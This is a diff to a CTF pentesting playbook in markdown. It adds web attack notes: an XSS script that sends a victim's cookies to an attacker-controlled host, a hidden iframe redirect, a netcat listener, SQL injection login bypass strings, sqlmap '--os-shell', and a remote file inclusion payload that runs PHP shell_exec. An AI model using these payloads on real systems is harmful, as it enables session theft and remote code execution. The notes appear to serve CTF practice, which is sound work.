@@ -32,7 +32,7 @@ Previous Play Icon:
     - [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
     - [SQL Injection](#sql-injection)
     - [XPath Injection](#xpath-injection)
-    - [Local File Exclusion](#local-file-exclusion)
+    - [Local File Inclusion](#local-file-inclusion)
     - [Remote File Inclusion](#remote-file-inclusion)
   - [Port 20 FTP](#port-20-ftp)
   - [Port 21 FTP](#port-21-ftp)
@@ -180,14 +180,28 @@ Digging deeper into particular services, and running massive vulnerability scans
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#weaponization) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)  
   
 ## Web Application Attack  
-### Cross Site Scripting (XSS)
+### Cross Site Scripting (XSS)  
+[Portswigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+[Bug Bounty XSS Cheat Sheet](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)  
 ```bash
 # Enter this into a web form to check for XSS vuln
 <script>alert("XSS")</script>
+
+# redirect victim to connect to attack machine
+<iframe> SRC='http://[attack ip]:81/report' height="0" width="0"></iframe>
+
+# get authenticated cookie from victim
+# step 1
+<script>
+new Image().src="http://[attack ip:81]
+/bogus.php?output="+document.cookie;
+</script>
+# step 2, start listener 
+nc -nlvp 81
+
 ```  
 ### SQL Injection    
 [OWASP SQL Injection Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)  
-[Bug Bounty XSS CheatSheet](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
 ```bash
 # Enter to a login page to check for SQL inj
 username: ' or '1' = '1'
@@ -203,12 +217,19 @@ sqlmap -u "domain" --os-shell
 ```bash
 
 ```
-### Local File Exclusion  
+### Local File Inclusion  
 ```bash
 
 ```
 ### Remote File Inclusion  
 ```bash
+# if GET is vulnerable to RFI 
+# Step 1: Host malicous code on attack machine 
+echo '<?php echo shell_exec("ipconfig");?>' > /var/www/evil.txt # windows
+# redirect GET parameter with remote file
+Example: http://ip/test.php?name=test&LANG=http://[attackip/evil.txt]
+
+
 
 ```  
 
